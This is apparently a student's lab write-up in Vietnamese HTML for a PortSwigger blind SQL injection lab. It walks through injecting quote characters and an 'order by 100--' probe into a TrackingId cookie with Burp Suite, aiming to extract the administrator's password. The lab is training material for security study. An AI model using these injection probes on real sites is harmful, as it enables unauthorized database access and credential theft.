+class=SpellE><span style='font-size:16.0pt;line-height:106%'>L&#7895;i</span></span><span
+style='font-size:16.0pt;line-height:106%'> chi <span class=SpellE>ti&#7871;t</span>:
+<span class=SpellE>&#7912;ng</span> <span class=SpellE>d&#7909;ng</span> <span
+class=SpellE>hi&#7875;n</span> <span class=SpellE>th&#7883;</span> <span
+class=SpellE>l&#7895;i</span> chi <span class=SpellE>ti&#7871;t</span> <span
+class=SpellE>v&#7873;</span> <span class=SpellE>truy</span> <span class=SpellE>v&#7845;n</span>
+SQL, bao <span class=SpellE>g&#7891;m</span> <span class=SpellE>tên</span> <span
+class=SpellE>b&#7843;ng</span>, <span class=SpellE>tên</span> <span
+class=SpellE>c&#7897;t</span>, <span class=SpellE>l&#7895;i</span> <span
+class=SpellE>cú</span> <span class=SpellE>pháp</span> <span class=SpellE>c&#7909;</span>
+<span class=SpellE>th&#7875;</span>.<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-align:justify;text-justify:
+inter-ideograph;text-indent:-.25in;mso-list:l2 level1 lfo5'><![if !supportLists]><span
+style='font-size:16.0pt;line-height:106%;font-family:Symbol;mso-fareast-font-family:
+Symbol;mso-bidi-font-family:Symbol'><span style='mso-list:Ignore'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><![endif]><span
+class=SpellE><span style='font-size:16.0pt;line-height:106%'>Th&#7901;i</span></span><span
+style='font-size:16.0pt;line-height:106%'> <span class=SpellE>gian</span> <span
+class=SpellE>ph&#7843;n</span> <span class=SpellE>h&#7891;i</span>: <span
+class=SpellE>Th&#7901;i</span> <span class=SpellE>gian</span> <span
+class=SpellE>ph&#7843;n</span> <span class=SpellE>h&#7891;i</span> <span
+class=SpellE>c&#7911;a</span> <span class=SpellE>trang</span> web <span
+class=SpellE>thay</span> <span class=SpellE>&#273;&#7893;i</span> <span
+class=SpellE>tùy</span> <span class=SpellE>thu&#7897;c</span> <span
+class=SpellE>vào</span> <span class=SpellE>truy</span> <span class=SpellE>v&#7845;n</span>
+SQL, <span class=SpellE>t&#7841;o</span> <span class=SpellE>c&#417;</span> <span
+class=SpellE>h&#7897;i</span> <span class=SpellE>cho</span> <span class=SpellE>k&#7867;</span>
+<span class=SpellE>t&#7845;n</span> <span class=SpellE>công</span> <span
+class=SpellE>phân</span> <span class=SpellE>bi&#7879;t</span> <span
+class=SpellE>các</span> <span class=SpellE>tr&#432;&#7901;ng</span> <span
+class=SpellE>h&#7907;p</span> <span class=SpellE>thành</span> <span
+class=SpellE>công</span> <span class=SpellE>và</span> <span class=SpellE>th&#7845;t</span>
+<span class=SpellE>b&#7841;i</span>.<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-align:justify;text-justify:
+inter-ideograph;text-indent:-.25in;mso-list:l2 level1 lfo5'><![if !supportLists]><span
+style='font-size:16.0pt;line-height:106%;font-family:Symbol;mso-fareast-font-family:
+Symbol;mso-bidi-font-family:Symbol'><span style='mso-list:Ignore'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><![endif]><span
+class=SpellE><span style='font-size:16.0pt;line-height:106%'>L&#7895;i</span></span><span
+style='font-size:16.0pt;line-height:106%'> logic: <span class=SpellE>&#7912;ng</span>
+<span class=SpellE>d&#7909;ng</span> <span class=SpellE>hi&#7875;n</span> <span
+class=SpellE>th&#7883;</span> <span class=SpellE>l&#7895;i</span> logic <span
+class=SpellE>thay</span> <span class=SpellE>vì</span> <span class=SpellE>l&#7895;i</span>
+<span class=SpellE>cú</span> <span class=SpellE>pháp</span> <span class=SpellE>khi</span>
+<span class=SpellE>truy</span> <span class=SpellE>v&#7845;n</span> SQL <span
+class=SpellE>sai</span>, <span class=SpellE>nh&#432;ng</span> <span
+class=SpellE>v&#7851;n</span> <span class=SpellE>cung</span> <span
+class=SpellE>c&#7845;p</span> <span class=SpellE>thông</span> tin <span
+class=SpellE>h&#7919;u</span> <span class=SpellE>ích</span> <span class=SpellE>cho</span>
+<span class=SpellE>k&#7867;</span> <span class=SpellE>t&#7845;n</span> <span
+class=SpellE>công</span>.<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-align:justify;text-justify:
+inter-ideograph;text-indent:-.25in;mso-list:l2 level1 lfo5'><![if !supportLists]><span
+style='font-size:16.0pt;line-height:106%;font-family:Symbol;mso-fareast-font-family:
+Symbol;mso-bidi-font-family:Symbol'><span style='mso-list:Ignore'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><![endif]><span
+class=SpellE><span style='font-size:16.0pt;line-height:106%'>S&#7917;</span></span><span
+style='font-size:16.0pt;line-height:106%'> <span class=SpellE>d&#7909;ng</span>
+<span class=SpellE>truy</span> <span class=SpellE>v&#7845;n</span> <span
+class=SpellE>không</span> an <span class=SpellE>toàn</span>: <span
+class=SpellE>&#7912;ng</span> <span class=SpellE>d&#7909;ng</span> <span
+class=SpellE>không</span> <span class=SpellE>s&#7917;</span> <span
+class=SpellE>d&#7909;ng</span> prepared statements <span class=SpellE>ho&#7863;c</span>
+parameterized queries, <span class=SpellE>cho</span> <span class=SpellE>phép</span>
+<span class=SpellE>k&#7867;</span> <span class=SpellE>t&#7845;n</span> <span
+class=SpellE>công</span> <span class=SpellE>d&#7877;</span> <span class=SpellE>dàng</span>
+<span class=SpellE>tiêm</span> <span class=SpellE>mã</span> <span class=SpellE>&#273;&#7897;c</span>
+<span class=SpellE>h&#7841;i</span> <span class=SpellE>vào</span> <span
+class=SpellE>truy</span> <span class=SpellE>v&#7845;n</span>.<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-align:justify;text-justify:
+inter-ideograph;text-indent:-.5in;mso-text-indent-alt:-.25in;mso-list:l7 level1 lfo2'><![if !supportLists]><span
+class=MsoHyperlink><b><span style='font-size:16.0pt;line-height:106%;
+mso-fareast-font-family:Calibri;mso-fareast-theme-font:minor-latin;mso-bidi-font-family:
+Calibri;mso-bidi-theme-font:minor-latin;color:windowtext;text-decoration:none;
+text-underline:none'><span style='mso-list:Ignore'><span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;
+</span>II.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span></b></span><![endif]><b><span style='font-size:16.0pt;
+line-height:106%'>Perform challenge: </span></b><span style='font-size:16.0pt;
+line-height:106%'><a
+href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors"><b>Blind
+SQL injection with conditional errors</b></a><span class=MsoHyperlink><b><span
+style='color:windowtext;text-decoration:none;text-underline:none'><o:p></o:p></span></b></span></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-.25in;mso-list:l1 level1 lfo6'><![if !supportLists]><span
+style='font-size:16.0pt;line-height:106%;font-family:Symbol;mso-fareast-font-family:
+Symbol;mso-bidi-font-family:Symbol'><span style='mso-list:Ignore'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><![endif]><span
+class=SpellE><span style='font-size:16.0pt;line-height:106%'>Phòng</span></span><span
+style='font-size:16.0pt;line-height:106%'> <span class=SpellE>thí</span> <span
+class=SpellE>nghi&#7879;m</span> <span class=SpellE>này</span> <span
+class=SpellE>ch&#7913;a</span> <span class=SpellE>m&#7897;t</span> <span
+class=SpellE>l&#7895;</span> <span class=SpellE>h&#7893;ng</span> SQL injection
+<span class=SpellE>mù</span>. <span class=SpellE>&#7912;ng</span> <span
+class=SpellE>d&#7909;ng</span> <span class=SpellE>s&#7917;</span> <span
+class=SpellE>d&#7909;ng</span> cookie <span class=SpellE>theo</span> <span
+class=SpellE>dõi</span> <span class=SpellE>&#273;&#7875;</span> <span
+class=SpellE>phân</span> <span class=SpellE>tích</span> <span class=SpellE>và</span>
+<span class=SpellE>th&#7921;c</span> <span class=SpellE>hi&#7879;n</span> <span
+class=SpellE>truy</span> <span class=SpellE>v&#7845;n</span> SQL <span
+class=SpellE>có</span> <span class=SpellE>ch&#7913;a</span> <span class=SpellE>giá</span>
+<span class=SpellE>tr&#7883;</span> <span class=SpellE>c&#7911;a</span> cookie <span
+class=SpellE>&#273;ã</span> <span class=SpellE>g&#7917;i</span>.<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-.25in;mso-list:l1 level1 lfo6'><![if !supportLists]><span
+style='font-size:16.0pt;line-height:106%;font-family:Symbol;mso-fareast-font-family:
+Symbol;mso-bidi-font-family:Symbol'><span style='mso-list:Ignore'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><![endif]><span
+class=SpellE><span style='font-size:16.0pt;line-height:106%'>K&#7871;t</span></span><span
+style='font-size:16.0pt;line-height:106%'> <span class=SpellE>qu&#7843;</span> <span
+class=SpellE>c&#7911;a</span> <span class=SpellE>truy</span> <span
+class=SpellE>v&#7845;n</span> SQL <span class=SpellE>không</span> <span
+class=SpellE>&#273;&#432;&#7907;c</span> <span class=SpellE>tr&#7843;</span> <span
+class=SpellE>v&#7873;</span> <span class=SpellE>và</span> <span class=SpellE>&#7913;ng</span>
+<span class=SpellE>d&#7909;ng</span> <span class=SpellE>không</span> <span
+class=SpellE>ph&#7843;n</span> <span class=SpellE>h&#7891;i</span> <span
+class=SpellE>khác</span> <span class=SpellE>nhau</span> <span class=SpellE>d&#7921;a</span>
+<span class=SpellE>trên</span> <span class=SpellE>vi&#7879;c</span> <span
+class=SpellE>truy</span> <span class=SpellE>v&#7845;n</span> <span
+class=SpellE>tr&#7843;</span> <span class=SpellE>v&#7873;</span> <span
+class=SpellE>b&#7845;t</span> <span class=SpellE>k&#7923;</span> <span
+class=SpellE>hàng</span> <span class=SpellE>nào</span>. <span class=SpellE>N&#7871;u</span>
+<span class=SpellE>truy</span> <span class=SpellE>v&#7845;n</span> SQL <span
+class=SpellE>gây</span> <span class=SpellE>ra</span> <span class=SpellE>l&#7895;i</span>,
+<span class=SpellE>thì</span> <span class=SpellE>&#7913;ng</span> <span
+class=SpellE>d&#7909;ng</span> <span class=SpellE>s&#7869;</span> <span
+class=SpellE>tr&#7843;</span> <span class=SpellE>v&#7873;</span> <span
+class=SpellE>thông</span> <span class=SpellE>báo</span> <span class=SpellE>l&#7895;i</span>
+<span class=SpellE>tùy</span> <span class=SpellE>ch&#7881;nh</span>.<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-.25in;mso-list:l1 level1 lfo6'><![if !supportLists]><span
+style='font-size:16.0pt;line-height:106%;font-family:Symbol;mso-fareast-font-family:
+Symbol;mso-bidi-font-family:Symbol'><span style='mso-list:Ignore'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><![endif]><span
+class=SpellE><span style='font-size:16.0pt;line-height:106%'>C&#417;</span></span><span
+style='font-size:16.0pt;line-height:106%'> <span class=SpellE>s&#7903;</span> <span
+class=SpellE>d&#7919;</span> <span class=SpellE>li&#7879;u</span> <span
+class=SpellE>ch&#7913;a</span> <span class=SpellE>m&#7897;t</span> <span
+class=SpellE>b&#7843;ng</span> <span class=SpellE>khác</span> <span
+class=SpellE>g&#7885;i</span> <span class=SpellE>là</span> <span class=GramE>Users
+,</span> <span class=SpellE>v&#7899;i</span> <span class=SpellE>các</span> <span
+class=SpellE>c&#7897;t</span> <span class=SpellE>&#273;&#432;&#7907;c</span> <span
+class=SpellE>g&#7885;i</span> <span class=SpellE>là</span> username <span
+class=SpellE>và</span> password. <span class=SpellE>C&#7847;n</span> <span
+class=SpellE>khai</span> <span class=SpellE>thác</span> <span class=SpellE>l&#7895;</span>
+<span class=SpellE>h&#7893;ng</span> SQL injection <span class=SpellE>mù</span>
+<span class=SpellE>&#273;&#7875;</span> <span class=SpellE>tìm</span> <span
+class=SpellE>ra</span> <span class=SpellE>m&#7853;t</span> <span class=SpellE>kh&#7849;u</span>
+<span class=SpellE>c&#7911;a</span> <span class=SpellE>ng&#432;&#7901;i</span> <span
+class=SpellE>dùng</span> administrator<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-.25in;mso-list:l1 level1 lfo6'><![if !supportLists]><span
+style='font-size:16.0pt;line-height:106%;font-family:Symbol;mso-fareast-font-family:
+Symbol;mso-bidi-font-family:Symbol'><span style='mso-list:Ignore'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><![endif]><span
+class=SpellE><span style='font-size:16.0pt;line-height:106%'>&#272;&#7875;</span></span><span
+style='font-size:16.0pt;line-height:106%'> <span class=SpellE>gi&#7843;i</span>
+<span class=SpellE>quy&#7871;t</span> <span class=SpellE>th&#7917;</span> <span
+class=SpellE>thách</span> <span class=SpellE>này</span>, <span class=SpellE>hãy</span>
+<span class=SpellE>&#273;&#259;ng</span> <span class=SpellE>nh&#7853;p</span> <span
+class=SpellE>v&#7899;i</span> <span class=SpellE>t&#432;</span> <span
+class=SpellE>cách</span> <span class=SpellE>ng&#432;&#7901;i</span> <span
+class=SpellE>dùng</span>: administrator<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpLast style='text-align:justify;text-justify:inter-ideograph;
+text-indent:-.5in;mso-text-indent-alt:-.25in;mso-list:l7 level1 lfo2'><![if !supportLists]><b><span
+style='font-size:16.0pt;line-height:106%;mso-fareast-font-family:Calibri;
+mso-fareast-theme-font:minor-latin;mso-bidi-font-family:Calibri;mso-bidi-theme-font:
+minor-latin'><span style='mso-list:Ignore'><span style='font:7.0pt "Times New Roman"'><span
+style='mso-spacerun:yes'> </span></span>III.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span></b><![endif]><b><span style='font-size:16.0pt;line-height:
+106%'>Explain and capture all steps (full windows screen capture).<o:p></o:p></span></b></p>
+
+<p class=MsoNormal style='text-align:justify;text-justify:inter-ideograph'><span
+class=SpellE><span style='font-size:16.0pt;line-height:106%'>Truy</span></span><span
+style='font-size:16.0pt;line-height:106%'> <span class=SpellE>c&#7853;p</span> <span
+class=SpellE>trang</span> <span class=SpellE>&#273;&#7847;u</span> <span
+class=SpellE>c&#7911;a</span> <span class=SpellE>c&#7917;a</span> <span
+class=SpellE>hàng</span> <span class=SpellE>và</span> <span class=SpellE>s&#7917;</span>
+<span class=SpellE>d&#7909;ng</span> Burp Suite <span class=SpellE>&#273;&#7875;</span>
+<span class=SpellE>ch&#7863;n</span> <span class=SpellE>và</span> <span
+class=SpellE>s&#7917;a</span> <span class=SpellE>&#273;&#7893;i</span> <span
+class=SpellE>yêu</span> <span class=SpellE>c&#7847;u</span> <span class=SpellE>có</span>
+<span class=SpellE>ch&#7913;a</span> cookie.<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify;text-justify:inter-ideograph'><span
+style='font-size:16.0pt;line-height:106%'>Cookie: <span class=SpellE>TrackingId</span>=<span
+class=GramE>…..</span>;<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;mso-no-proof:
+yes'><!--[if gte vml 1]><v:shapetype id="_x0000_t75" coordsize="21600,21600"
+ o:spt="75" o:preferrelative="t" path="m@4@5l@4@11@9@11@9@5xe" filled="f"
+ stroked="f">
+ <v:stroke joinstyle="miter"/>
+ <v:formulas>
+  <v:f eqn="if lineDrawn pixelLineWidth 0"/>
+  <v:f eqn="sum @0 1 0"/>
+  <v:f eqn="sum 0 0 @1"/>
+  <v:f eqn="prod @2 1 2"/>
+  <v:f eqn="prod @3 21600 pixelWidth"/>
+  <v:f eqn="prod @3 21600 pixelHeight"/>
+  <v:f eqn="sum @0 0 1"/>
+  <v:f eqn="prod @6 1 2"/>
+  <v:f eqn="prod @7 21600 pixelWidth"/>
+  <v:f eqn="sum @8 21600 0"/>
+  <v:f eqn="prod @7 21600 pixelHeight"/>
+  <v:f eqn="sum @10 21600 0"/>
+ </v:formulas>
+ <v:path o:extrusionok="f" gradientshapeok="t" o:connecttype="rect"/>
+ <o:lock v:ext="edit" aspectratio="t"/>
+</v:shapetype><v:shape id="_x0000_i1050" type="#_x0000_t75" alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+ style='width:1261.5pt;height:656.25pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image002.png"
+  o:title="A screenshot of a computer&#10;&#10;Description automatically generated"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=1682 height=875
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image003.png"
+alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+v:shapes="_x0000_i1050"><![endif]></span><span style='font-size:16.0pt;
+line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify;text-justify:inter-ideograph'><span
+class=SpellE><span style='font-size:16.0pt;line-height:106%'>S&#7917;a</span></span><span
+style='font-size:16.0pt;line-height:106%'> <span class=SpellE>&#273;&#7893;i</span>
+cookie, <span class=SpellE>thêm</span> <span class=SpellE>m&#7897;t</span> <span
+class=SpellE>d&#7845;u</span> <span class=SpellE>vào</span> <span class=SpellE>&#273;ó</span>:
+<span class=SpellE>TrackingId</span>=<span class=SpellE>xyz</span>'<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify;text-justify:inter-ideograph'><span
+class=SpellE><span style='font-size:16.0pt;line-height:106%'>M&#7909;c</span></span><span
+style='font-size:16.0pt;line-height:106%'> <span class=SpellE>&#273;ích</span> <span
+class=SpellE>D&#7845;u</span> ' <span class=SpellE>có</span> <span
+class=SpellE>th&#7875;</span> <span class=SpellE>&#273;&#432;&#7907;c</span> <span
+class=SpellE>s&#7917;</span> <span class=SpellE>d&#7909;ng</span> <span
+class=SpellE>&#273;&#7875;</span> <span class=SpellE>t&#7841;o</span> <span
+class=SpellE>ra</span> <span class=SpellE>các</span> <span class=SpellE>&#273;i&#7873;u</span>
+<span class=SpellE>ki&#7879;n</span> logic <span class=SpellE>trong</span> <span
+class=SpellE>truy</span> <span class=SpellE>v&#7845;n</span> SQL.<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;mso-no-proof:
+yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_2" o:spid="_x0000_i1049"
+ type="#_x0000_t75" alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+ style='width:1262.25pt;height:532.5pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image004.png"
+  o:title="A screenshot of a computer&#10;&#10;Description automatically generated"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=1683 height=710
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image005.png"
+alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+v:shapes="Picture_x0020_2"><![endif]></span><span style='font-size:16.0pt;
+line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span class=SpellE><span style='font-size:16.0pt;line-height:
+106%'>Truy</span></span><span style='font-size:16.0pt;line-height:106%'> <span
+class=SpellE>v&#7845;n</span> <span class=SpellE>&#273;&#432;&#7907;c</span> <span
+class=SpellE>t&#7841;o</span> <span class=SpellE>ra</span> <span class=SpellE>không</span>
+<span class=SpellE>h&#7907;p</span> <span class=SpellE>l&#7879;</span> <span
+class=SpellE>v&#7873;</span> <span class=SpellE>m&#7863;t</span> <span
+class=SpellE>cú</span> <span class=SpellE>pháp</span>,&nbsp;back-end <span
+class=SpellE>s&#7869;</span> <span class=SpellE>tr&#7843;</span> <span
+class=SpellE>v&#7873;</span> <span class=SpellE>l&#7895;i</span>.<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;mso-no-proof:
+yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_3" o:spid="_x0000_i1048"
+ type="#_x0000_t75" alt="A screenshot of a computer screen&#10;&#10;Description automatically generated"
+ style='width:1264.5pt;height:533.25pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image006.png"
+  o:title="A screenshot of a computer screen&#10;&#10;Description automatically generated"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=1686 height=711
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image007.png"
+alt="A screenshot of a computer screen&#10;&#10;Description automatically generated"
+v:shapes="Picture_x0020_3"><![endif]></span><span style='font-size:16.0pt;
+line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span class=SpellE><span style='font-size:16.0pt;line-height:
+106%'>G&#7917;i</span></span><span style='font-size:16.0pt;line-height:106%'>
+request sang <span class=SpellE>công</span> <span class=SpellE>c&#7909;</span>
+Repeater <span class=SpellE>và</span> <span class=SpellE>th&#7917;</span> <span
+class=SpellE>l&#7841;i</span> <span class=SpellE><span class=GramE>thêm</span></span><span
+class=GramE> ’</span> <span class=SpellE>vào</span> <span class=SpellE>TrackingId:xyz</span>’’<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;mso-no-proof:
+yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_4" o:spid="_x0000_i1047"
+ type="#_x0000_t75" alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+ style='width:1288.5pt;height:543pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image008.png"
+  o:title="A screenshot of a computer&#10;&#10;Description automatically generated"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=1718 height=724
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image009.png"
+alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+v:shapes="Picture_x0020_4"><![endif]></span><span style='font-size:16.0pt;
+line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span class=SpellE><span style='font-size:16.0pt;line-height:
+106%'>K&#7871;t</span></span><span style='font-size:16.0pt;line-height:106%'> <span
+class=SpellE>qu&#7843;</span> <span class=SpellE>câu</span> <span class=SpellE>truy</span>
+<span class=SpellE>v&#7845;n</span> <span class=SpellE>&#273;ã</span> <span
+class=SpellE>th&#7921;c</span> <span class=SpellE>hi&#7879;n</span> <span
+class=SpellE>thành</span> <span class=SpellE>công</span>. <span class=SpellE>&#272;i&#7873;u</span>
+<span class=SpellE>này</span> <span class=SpellE>cho</span> <span class=SpellE>th&#7845;y</span>
+<span class=SpellE>r&#7857;ng</span> <span class=SpellE>l&#7895;i</span> <span
+class=SpellE>cú</span> <span class=SpellE>pháp</span> (<span class=SpellE>trong</span>
+<span class=SpellE>tr&#432;&#7901;ng</span> <span class=SpellE>h&#7907;p</span>
+<span class=SpellE>này</span> <span class=SpellE>là</span> <span class=SpellE>d&#7845;u</span>
+<span class=SpellE>ngo&#7863;c</span> <span class=SpellE>kép</span> <span
+class=SpellE>ch&#432;a</span> <span class=SpellE>&#273;&#432;&#7907;c</span> <span
+class=SpellE>&#273;óng</span>) <span class=SpellE>&#273;ang</span> <span
+class=SpellE>có</span> <span class=SpellE>&#7843;nh</span> <span class=SpellE>h&#432;&#7903;ng</span>
+<span class=SpellE>có</span> <span class=SpellE>th&#7875;</span> <span
+class=SpellE>phát</span> <span class=SpellE>hi&#7879;n</span> <span
+class=SpellE>&#273;&#432;&#7907;c</span> <span class=SpellE>&#273;&#7889;i</span>
+<span class=SpellE>v&#7899;i</span> <span class=SpellE>ph&#7843;n</span> <span
+class=SpellE>h&#7891;i</span>.<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;mso-no-proof:
+yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_5" o:spid="_x0000_i1046"
+ type="#_x0000_t75" alt="A computer screen shot of a computer screen&#10;&#10;Description automatically generated"
+ style='width:1289.25pt;height:544.5pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image010.png"
+  o:title="A computer screen shot of a computer screen&#10;&#10;Description automatically generated"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=1719 height=726
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image011.png"
+alt="A computer screen shot of a computer screen&#10;&#10;Description automatically generated"
+v:shapes="Picture_x0020_5"><![endif]></span><span style='font-size:16.0pt;
+line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%'>Nh&#432; <span
+class=SpellE>v&#7853;y</span> <span class=SpellE>&#273;ã</span> <span
+class=SpellE>có</span> <span class=SpellE>th&#7875;</span> <span class=SpellE>ti&#7871;n</span>
+<span class=SpellE>hành</span> <span class=SpellE>th&#7921;c</span> <span
+class=SpellE>hi&#7879;n</span> <span class=SpellE>các</span> <span
+class=SpellE>câu</span> <span class=SpellE>l&#7879;nh</span> <span
+class=SpellE>truy</span> <span class=SpellE>v&#7845;n</span> SQL<o:p></o:p></span></p>
+
+<p class=MsoNormal><span class=SpellE><b><span style='font-size:16.0pt;
+line-height:106%'>Tìm</span></b></span><b><span style='font-size:16.0pt;
+line-height:106%'> <span class=SpellE>s&#7889;</span> <span class=SpellE>l&#432;&#7907;ng</span>
+<span class=SpellE>c&#7897;t</span> <o:p></o:p></span></b></p>
+
+<p class=MsoNormal><span class=SpellE><span style='font-size:16.0pt;line-height:
+106%'>Hãy</span></span><span style='font-size:16.0pt;line-height:106%'> <span
+class=SpellE>th&#7917;</span> <span class=GramE>‘ order</span> by 100--; <span
+class=SpellE>s&#7855;p</span> <span class=SpellE>x&#7871;p</span> <span
+class=SpellE>k&#7871;t</span> <span class=SpellE>qu&#7843;</span> <span
+class=SpellE>theo</span> <span class=SpellE>th&#7913;</span> <span
+class=SpellE>t&#7921;</span> 100 <span class=SpellE>c&#7897;t</span> <span
+class=SpellE>&#273;&#7875;</span> <span class=SpellE>&#273;oán</span> <span
+class=SpellE>s&#7889;</span> <span class=SpellE>l&#432;&#7907;ng</span> <span
+class=SpellE>c&#7897;t</span> <span class=SpellE>có</span> <span class=SpellE>trong</span>
+<span class=SpellE>b&#7843;ng</span> , -- <span class=SpellE>&#273;&#7875;</span>
+<span class=SpellE>ng&#7855;t</span> <span class=SpellE>câu</span> <span
+class=SpellE>l&#7879;nh</span> <o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;mso-no-proof:
+yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_6" o:spid="_x0000_i1045"
+ type="#_x0000_t75" alt="A screenshot of a computer program&#10;&#10;Description automatically generated"
+ style='width:1292.25pt;height:544.5pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image012.png"
+  o:title="A screenshot of a computer program&#10;&#10;Description automatically generated"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=1723 height=726
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image013.png"
+alt="A screenshot of a computer program&#10;&#10;Description automatically generated"
+v:shapes="Picture_x0020_6"><![endif]></span><span style='font-size:16.0pt;
+line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span class=SpellE><span style='font-size:16.0pt;line-height:
+106%'>Rõ</span></span><span style='font-size:16.0pt;line-height:106%'> <span
+class=SpellE>ràng</span>, <span class=SpellE>s&#7889;</span> <span
+class=SpellE>l&#432;&#7907;ng</span> <span class=SpellE>c&#7897;t</span> <span
+class=SpellE>trong</span> <span class=SpellE>b&#7843;ng</span> <span
+class=SpellE>ít</span> <span class=SpellE>h&#417;n</span> 100, <span
+class=SpellE>hãy</span> <span class=SpellE>g&#7917;i</span> <span class=SpellE>nó</span>
+sang <span class=SpellE>công</span> <span class=SpellE>c&#7909;</span> Intruder
+<span class=SpellE>&#273;&#7875;</span> <span class=SpellE>t&#7841;o</span>
+payload <span class=SpellE>&#273;&#7875;</span> <span class=SpellE>th&#7917;</span>
+<span class=SpellE>m&#7897;t</span> <span class=SpellE>cách</span> <span
+class=SpellE>t&#7921;</span> <span class=SpellE><span class=GramE>&#273;&#7897;ng</span></span><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;mso-no-proof:
+yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_7" o:spid="_x0000_i1044"
+ type="#_x0000_t75" alt="A screenshot of a computer program&#10;&#10;Description automatically generated"
+ style='width:1295.25pt;height:545.25pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image014.png"
+  o:title="A screenshot of a computer program&#10;&#10;Description automatically generated"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=1727 height=727
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image015.png"
+alt="A screenshot of a computer program&#10;&#10;Description automatically generated"
